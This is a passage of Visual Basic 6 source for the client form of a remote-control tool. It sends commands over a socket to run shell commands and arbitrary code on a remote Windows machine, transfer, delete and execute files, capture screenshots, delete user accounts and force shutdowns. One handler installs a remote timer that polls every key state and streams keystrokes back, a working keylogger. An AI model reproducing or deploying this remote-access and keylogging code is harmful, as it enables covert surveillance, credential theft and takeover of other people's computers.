                            If LCase(GetFileExtension(sPath)) = "ico" Then
                                Index = ImageIcons.ListImages.Add(, sIcon, LoadPicture(sPath)).Index
                                Item.SmallIcon = Index
                            Else
                                lTemp = -Val(aTemp(1))
                                If FileIcon.LoadIconFromEXE(sPath, lTemp) Then
                                    Index = ImageIcons.ListImages.Add(, sIcon, FileIcon.IconPicture(Me.hdc, FileIcon.ClosestIndex(2, 16))).Index
                                    Item.SmallIcon = Index
                                Else
                                    Item.SmallIcon = 1
                                End If
                            End If
                                                       
                        Else
                            Item.SmallIcon = Icon.Index
                        End If
                    Else
                        Item.SmallIcon = 1
                    End If
                    
                Else
                
                    ' This is a file folder
                    Item.SubItems(2) = "File Folder"
                    Item.SmallIcon = 2 ' This is the index to the icon for a folder
                
                End If
            
            End If
        
        Next
    
    End If

End Sub

Public Function ReplaceEnviroment(sText As String) As String

    Dim Tell As Long, NextChar As Long
    
    Do
    
        Tell = InStr(NextChar + 1, sText, "%")
        
        If Tell > 0 Then
        
            ReplaceEnviroment = ReplaceEnviroment & Mid(sText, NextChar + 1, Tell - NextChar - 1)
            
            NextChar = InStr(Tell + 1, sText, "%")
            
            ReplaceEnviroment = ReplaceEnviroment & Environ(Mid(sText, Tell + 1, NextChar - Tell - 1))
        
        Else
            ReplaceEnviroment = ReplaceEnviroment & Mid(sText, NextChar + 1)
            Exit Do
        End If
    
    Loop
    
End Function

Public Function GetFileType(sFile As String, sIcon As String) As String

    Dim sTemp As String
    
    ' First, get the name of this extension
    sTemp = Registry.GetString(HKEY_CLASSES_ROOT, "." & LCase(GetFileExtension(sFile)), "")
    
    ' Then simply get the description of this extension
    GetFileType = Registry.GetString(HKEY_CLASSES_ROOT, sTemp, "")
    
    ' Also get the path to the icon
    sIcon = Registry.GetString(HKEY_CLASSES_ROOT, sTemp & "\DefaultIcon\", "")
    
End Function

Public Sub LoadInformation()

    Connection.SendData "shell " & Chr(34) & "cmd.exe /C systeminfo > C:\Test.txt" & Chr(34) & vbCrLf

    If Left(WaitForData, 3) = "200" Then
    
        ' Write to txtInformation
        Set TextBox = txtInformation
    
        ' Clear the textbox
        TextBox.Text = ""
    
        ' Get the file
        Connection.SendData "get C:\Test.txt 1" & vbCrLf
    
        ' Write everything to the textbox
        State = 1

        ' Wait for the transmission to end
        WaitForState 0
        
        ' Delete the file
        Connection.SendData "delete C:\Test.txt" & vbCrLf
    
    Else
        ' Something went wrong
        MsgBox "Error: " & sText
    End If

End Sub

Private Sub cmdExitWindows_Click(Index As Integer)

    ' Send the shutdown-codes
    RunCode "Main.ExitWindows " & Index & ", " & IIf(chkForce.Value = 1, "True", "False") & vbCrLf

End Sub

Private Sub cmdFillColor_Click()

    Dim Color As Long
    
    Color = Val(InputBox("What color do you want to fill with"))

    ' Send the code
    RunCode "Main.FillAll " & Color & vbCrLf

End Sub

Private Sub cmdHMessageForm_Click()

    ' Send the code
    RunCode "Main.Message.HideMessageForm" & vbCrLf
    
End Sub

Private Sub cmdInvert_Click()

    ' Send the code
    RunCode "Main.InvertAll" & vbCrLf
    
End Sub

Private Sub cmdMessageBox_Click()

    Dim sCommand As String
    
    ' Generate the command
    sCommand = "Main.Message.Title = " & Chr(34) & SafeString(txtTitle.Text) & Chr(34) & vbCrLf
    sCommand = sCommand & "Main.Message.Message = " & Chr(34) & SafeString(txtText.Text) & Chr(34) & vbCrLf
    sCommand = sCommand & "Main.Message.ShowMessageBox(True)" & vbCrLf
    
    ' Send the code
    RunCode sCommand

End Sub

Private Sub cmdOpenScreenshot_Click()

    Dim sFileToOpen As String

    ' Get a temp file
    sFileToOpen = TempFile & "." & cmbSendAs.Text
    
    ' Download the screenshot
    DownloadScreenshot sFileToOpen, cmbSendAs.Text, Val(txtScreenWidth.Text), Val(txtScreenHeight.Text)

    ' Open the file
    ShellExecute Me.hwnd, vbNullString, sFileToOpen, vbNullString, "C:\", SW_SHOWNORMAL

End Sub

Private Sub cmdRedrawAll_Click()

    ' Send the code
    RunCode "Main.RedrawAll" & vbCrLf

End Sub

Private Sub cmdRemoveUser_Click()

    Dim Tell As Long, sCommand As String

    ' Generate the command
    sCommand = "runcode" & vbCrLf
    
    For Tell = 0 To lstUsers.ListCount - 1
        If lstUsers.Selected(Tell) Then
            sCommand = sCommand & "Main.DeleteUser " & Chr(34) & lstUsers.List(Tell) & Chr(34) & vbCrLf
        End If
    Next

    ' Send the command
    Connection.SendData sCommand
    
    ' Update the user list
    UpdateUserList

End Sub

Private Sub cmdRunFile_Click()

    ' Run the program
    RunCode "Main.Shell " & Chr(34) & txtFile & Chr(34) & ", 0" & vbCrLf

End Sub

Private Sub cmdSendCode_Click()

    ' Send the code
    RunCode Replace(txtCode.Text, vbCrLf & vbCrLf, vbCrLf & "'" & vbCrLf) & vbCrLf

End Sub

Private Sub cmdSendScreenshot_Click()

    OpenSave.SaveFile Me.hwnd, "Save screenshot"

    If OpenSave.File <> "" Then
        ' Send the screenshot
        DownloadScreenshot OpenSave.File, cmbSendAs.Text, Val(txtScreenWidth.Text), Val(txtScreenHeight.Text)
    End If
    
End Sub

Public Sub DownloadScreenshot(FileToSave As String, Extension As String, Width As Long, Height As Long)

    ' Set the global file string to this
    sFile = FileToSave

    ' Write everything to a file
    State = 2
    
    ' Ask for screenshot
    Connection.SendData "screenshot " & Extension & " 0 0 " & Width & " " & Height & vbCrLf
    
    ' Wait until it's finished
    WaitForState 0

End Sub

Private Sub cmdShowCommunication_Click()

    If frmCom.Visible = False Then
        frmCom.Show
    Else
        frmCom.Hide
    End If

End Sub

Public Function WaitForData() As String

    bWait = True
    sText = ""

    Do Until sText <> ""
        Sleep 10
        DoEvents
    Loop

    bWait = False
    WaitForData = sText

End Function

Public Function WaitForState(lngState As Long, Optional TimeOut As Long = -1)

    Dim StartTime As Long
    
    StartTime = GetTickCount

    Do Until State = lngState
    
        If TimeOut >= 0 Then
            If StartTime + TimeOut < GetTickCount Then
                WaitForState = -1
                Exit Function
            End If
        End If
    
        Sleep 10
        DoEvents
    Loop

End Function

Private Sub cmdRefreshInfo_Click()

    LoadInformation

End Sub

Private Sub cmdSMessageForm_Click()

    Dim sCommand As String

    ' Disable this command button
    cmdSMessageForm.Enabled = False

    ' Generate the command
    sCommand = "Main.Message.ShowMessageForm(True)" & vbCrLf
    sCommand = sCommand & "Main.Message.X = " & Val(txtPosX.Text) & vbCrLf
    sCommand = sCommand & "Main.Message.Y = " & Val(txtPosY.Text) & vbCrLf
    sCommand = sCommand & "Main.Message.Width = " & Val(txtWidth.Text) & vbCrLf
    sCommand = sCommand & "Main.Message.Height = " & Val(txtHeight.Text) & vbCrLf
    sCommand = sCommand & "Main.Message.Title = " & Chr(34) & SafeString(txtTitle.Text) & Chr(34) & vbCrLf
    sCommand = sCommand & "Main.Message.Message = " & Chr(34) & SafeString(txtText.Text) & Chr(34) & vbCrLf
    
    ' Send the command
    RunCode sCommand
    
    ' Enable this command button
    cmdSMessageForm.Enabled = True

End Sub

Public Function SafeString(ByVal sText As String) As String

    sText = Replace(sText, Chr(34), Chr(34) & " & Chr(34) & " & Chr(34))
    sText = Replace(sText, vbCrLf, Chr(34) & " & vbCrLf & " & Chr(34))
    SafeString = sText

End Function

Private Sub cmdStart_Click()

    Dim sCommand As String, sCode As String

    ' Disable this command and enable the other
    cmdStart.Enabled = False
    cmdStop.Enabled = True
    
    ' Create the new connection
    Set Monitor = New clsConnection
    
    ' Do not send data to log
    MonitorLog = False
    
    ' Create a monitor-socket
    Monitor.Connect Connection.Winsock.RemoteHost, Connection.Winsock.RemotePort
    WaitForFalse MonitorWait

    ' Logon
    Monitor.SendData "user " & Chr(34) & Username & Chr(34) & vbCrLf
    WaitForFalse MonitorWait
    
    Monitor.SendData "pass " & Chr(34) & Password & Chr(34) & vbCrLf
    WaitForFalse MonitorWait

    ' Start the monitoring
    Monitor.SendData "runcode" & vbCrLf
    WaitForFalse MonitorWait
    
    ' This is the code to be executed in the timer
    sCode = "KeyArray = Main.Variables.VariableValue(" & Chr(34) & "KeyVariables" & Chr(34) & ")" & vbCrLf & vbCrLf
    sCode = sCode & "If Not IsArray(KeyArray) Then" & vbCrLf
    sCode = sCode & "   ReDim KeyArray(255)" & vbCrLf
    sCode = sCode & "   For Tell = 0 To 255" & vbCrLf
    sCode = sCode & "       KeyArray(Tell) = 0" & vbCrLf
    sCode = sCode & "   Next" & vbCrLf
    sCode = sCode & "End If" & vbCrLf & vbCrLf
    sCode = sCode & "For Tell = 0 To 255" & vbCrLf
    sCode = sCode & "   If Main.KeyState(CLng(Tell)) < 0 Then" & vbCrLf
    sCode = sCode & "       If KeyArray(Tell) = 0 Then" & vbCrLf
    sCode = sCode & "           Connection.Winsock.SendData Chr(Tell)" & vbCrLf
    sCode = sCode & "           KeyArray(Tell) = 1" & vbCrLf
    sCode = sCode & "       End If" & vbCrLf
    sCode = sCode & "   Else" & vbCrLf
    sCode = sCode & "       KeyArray(Tell) = 0" & vbCrLf
    sCode = sCode & "   End If" & vbCrLf
    sCode = sCode & "Next" & vbCrLf & vbCrLf
    sCode = sCode & "Main.Variables.VariableValue(" & Chr(34) & "KeyVariables" & Chr(34) & ") = KeyArray" & vbCrLf
    
    ' Generate the command
    sCommand = "Main.Timer.AddTimer " & Chr(34) & SafeString(sCode) & Chr(34) & ", 10, Connection" & vbCrLf
    
    ' Send the command
    Monitor.SendData sCommand
    WaitForFalse MonitorWait

    ' The monitor should now have been installed
    MonitorLog = True
    
End Sub

Public Sub WaitForFalse(refBool As Boolean)

    MonitorWait = True

    Do While refBool
        Sleep 10
        DoEvents
    Loop

End Sub

Private Sub cmdStop_Click()

    ' Close the socket
    Monitor.Winsock.CloseSocket

    ' Reallocate resources
    Set Monitor = Nothing
    
    ' Clear up everything
    cmdStart.Enabled = True
    cmdStop.Enabled = False
    MonitorLog = False

End Sub

Private Sub Connection_ConnectionClosed()

    Unload Me

End Sub

Private Sub Connection_DataArrival(sData As String)

    Dim sCode As String, aCode As Variant, Tell As Long, Bytes As Long, DataStart As Long
    
    If Len(sData) < 3 Then
        Exit Sub
    End If

    If bWait Then
        sText = sData
        Exit Sub
    End If
    
    Select Case State
    Case -1 ' We're simply waitning for a response
    
        State = 0
    
    Case 1, 2 ' Write everything to a spesific textbox or file
    
        Tell = 1
    
        If FileOverflow > 0 Then
            If State = 1 Then
                TextBox.Text = TextBox.Text & Mid(sData, 1, FileOverflow)
            ElseIf State = 2 Then
                WriteFile sFile, Mid(sData, 1, FileOverflow)
            End If
            
            Tell = FileOverflow + 3
            FileOverflow = 0
        End If
    
        Do Until Tell > Len(sData)
            DataStart = InStr(IIf(Tell < 1, 1, Tell), sData, vbCrLf)
            
            If DataStart > 0 Then
            
                aCode = Split(Mid(sData, Tell, DataStart - Tell), " ", 3)
                Bytes = Val(aCode(2))
            
                If Val(aCode(0)) = 200 Then
                
                    If Len(sData) - Bytes - DataStart - 2 < 1 Then
                        FileOverflow = Bytes - Len(sData) + DataStart + 1
                        Bytes = Bytes - FileOverflow
                    End If
                
                    If State = 1 Then
                        TextBox.Text = TextBox.Text & Mid(sData, DataStart + 2, Bytes)
                    ElseIf State = 2 Then
                        WriteFile sFile, Mid(sData, DataStart + 2, Bytes), Val(aCode(1))
                    End If
                    
                    Tell = DataStart + Bytes + 4
                
                ElseIf Val(aCode(0)) = 255 Then
                    ' We're finished
                    State = 0
                    Exit Do
                Else
                
                    MsgBox "Error: Transfer-state couldn't be read.", vbCritical, "Error"
                
                    ' Something went wrong
                    State = 0
                    Exit Do
                End If
            Else
                Exit Do
            End If
            
        Loop

    Case 3 ' We have a file-list
    
        If sText = "" Then
        
            ' Where does the data start?
            DataStart = InStr(1, sData, vbCrLf)
        
            ' Find the return-code
            sCode = Mid(sData, 1, 3)
            
            ' How many bytes are we suppose to get
            BytesToSend = Val(RemoveLetters(Mid(sData, 4, DataStart - 4)))
            
            If sCode = 200 Then
                sText = Mid(sData, DataStart + 2)
            Else
                State = 0
            End If
            
            If Len(sText) >= BytesToSend Then
                State = 0
            End If
            
        Else
        
            ' We'll just add the text
            sText = sText & sData
            
            If Len(sText) >= BytesToSend Then
                State = 0
            End If
            
        End If
        
    Case 4 ' File sending
    
        ' If we've encountet an error, stop file sending
        If Mid(sData, 1, 3) = "500" Then
            State = 0
        End If
    
    End Select

End Sub

Private Sub Connection_DataSent()

    Dim Ret As Long

    ' Check and see if we're supposed to send a segment of a file
    If State = 4 Then

        If FileLen(sFile) > FilePos Then
            ' Send the segment
            Ret = Connection.SendFileSector(sFile, FilePos)
            
            If Ret < 0 Then
                ' We've encountet an error
                State = 0
            Else
                ' Increse the file position
                FilePos = FilePos + 1
            End If
        Else
            ' We're finished
            Connection.SendData "255 File sent." & vbCrLf
            
            ' Reset the state
            State = 0
        End If
        
    End If

End Sub

Private Sub Form_Load()

    Dim FileIcon(1) As New clsFileIcon, sShellPath As String
    
    ' Get the shell-path
    sShellPath = ReplaceEnviroment("%SystemRoot%\System32\shell32.dll")
    
    ' Load the default icons
    FileIcon(0).LoadIconFromEXE sShellPath, 1
    FileIcon(1).LoadIconFromEXE sShellPath, 4
    
    ' Add the icons
    ImageIcons.ListImages.Add , , FileIcon(0).IconPicture(Me.hdc, FileIcon(0).ClosestIndex(2, 16))
    ImageIcons.ListImages.Add , , FileIcon(1).IconPicture(Me.hdc, FileIcon(1).ClosestIndex(5, 16))

    ' Update the drive-list
    LoadDrives cmbDir

    ' Load different remote settings
    UpdateProgramSettings
    UpdateUserList
    UpdateUserControls

    ' Show the first tab
    tabStrip_Click
    
    ' Combo box as first element
    cmbSendAs.ListIndex = 0

    ' Hook the tabstrip
    HookControl TabStrip.hwnd, TabStrip

End Sub

Private Sub Form_Unload(Cancel As Integer)

    ' Unhook the tabstrip
    UnHookControl TabStrip.hwnd
    
    ' Tell the log-form to exit
    frmCom.ExitConnection = True
    
    ' Close the form
    Unload frmCom
    
    ' Show the logon-form
    frmLogon.Show

End Sub

Private Sub lstFiles_ColumnClick(ByVal ColumnHeader As ComctlLib.ColumnHeader)

    If lstFiles.SortKey = ColumnHeader.Index - 1 Then
        lstFiles.SortOrder = IIf(lstFiles.SortOrder = lvwAscending, lvwDescending, lvwAscending)
    Else
        lstFiles.SortOrder = lvwAscending
        lstFiles.SortKey = ColumnHeader.Index - 1
    End If
    
    lstFiles.Sorted = True

End Sub

Private Sub lstFiles_DblClick()

    ' If this is a directory
    If IsDir(lstFiles.SelectedItem.Text) Then

        ' Add this directory
        cmbDir.Text = ValidPath(ValidPath(cmbDir.Text) & lstFiles.SelectedItem.Text)

        ' Load the list
        ListFiles lstFiles, cmbDir.Text

    End If

End Sub

Private Sub lstFiles_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)

    Dim Item As ListItem

    If Button = 2 Then ' Right-click
    
        ' Try to select a item with these coordinates
        Set Item = lstFiles.HitTest(x, y)
        
        If Not Item Is Nothing Then
            Item.Selected = True
            
            ' Assume this is a file, and disable file uploading plus enable downloading
            mnuUpload.Enabled = False
            mnuDownload.Enabled = True
            mnuExecute.Enabled = True
        Else
            ' Do the inverse
            mnuUpload.Enabled = True
            mnuDownload.Enabled = False
            mnuExecute.Enabled = False
        End If
        
        ' Show the menu
        Me.PopupMenu mnuFile

    End If

End Sub

Private Sub mnuDelete_Click()

    Dim Tell As Long
    
    For Tell = 1 To lstFiles.ListItems.Count
        If lstFiles.ListItems(Tell).Selected Then

            ' Delete this file
            Connection.SendData "delete " & Chr(34) & ValidPath(cmbDir.Text) & lstFiles.ListItems(Tell).Text & Chr(34) & vbCrLf
        
            ' Wait for a response
            WaitForData
        
        End If
    Next

    ' Update the file-list
    ListFiles lstFiles, cmbDir.Text

End Sub

Private Sub mnuDownload_Click()

    Dim Tell As Long

    For Tell = 1 To lstFiles.ListItems.Count
        If lstFiles.ListItems(Tell).Selected Then

            OpenSave.SaveFile Me.hwnd, "Download file as ..."

            ' If the user has not pressed CANCEL
            If OpenSave.File <> "" Then
        
                ' Start downloading the file
                DownloadFile ValidPath(cmbDir.Text) & lstFiles.ListItems(Tell).Text, OpenSave.File

            End If

        End If
    Next

End Sub

Private Sub mnuExecute_Click()

    Dim sCommand As String
    
    ' Generate command
    sCommand = "Main.Shell " & Chr(34) & SafeString(ValidPath(cmbDir.Text) & lstFiles.SelectedItem.Text) & Chr(34) & ", 1"
    
    ' Run the code
    RunCode sCommand

End Sub

Private Sub mnuRename_Click()

    Dim sFile As String, Tell As Long
    
    For Tell = 1 To lstFiles.ListItems.Count
        If lstFiles.ListItems(Tell).Selected Then
            
            ' Ask the user about what the file should be called
            sFile = InputBox("What should " & lstFiles.ListItems(Tell).Text & " be called?")
            
            If sFile <> "" Then
            
                ' Send the request
                Connection.SendData "rename " & Chr(34) & ValidPath(cmbDir.Text) & lstFiles.ListItems(Tell).Text & Chr(34) & " " & Chr(34) & ValidPath(cmbDir.Text) & sFile & Chr(34) & vbCrLf

                ' Wait for a response
                WaitForData

            End If

        End If
    Next

End Sub

' Upload a file
Private Sub mnuUpload_Click()

    OpenSave.SaveFile Me.hwnd, "Select file to upload"

    ' If the user has not pressed CANCEL
    If OpenSave.File <> "" Then

        ' Start uploading the file
        UploadFile OpenSave.File, ValidPath(cmbDir.Text)
    
    End If

End Sub

Private Sub Monitor_DataArrival(sData As String)

    If MonitorWait Then
        MonitorWait = False
    End If

    If MonitorLog Then
        txtKeys.Text = txtKeys.Text & KeyName(Asc(sData), 0, 0)
    End If

End Sub

Private Sub tabStrip_Click()

    Dim Tell As Long
    
    For Tell = 0 To picTab.Count - 1
        picTab(Tell).Visible = CBool(Tell = (TabStrip.SelectedItem.Index - 1))
    Next

End Sub
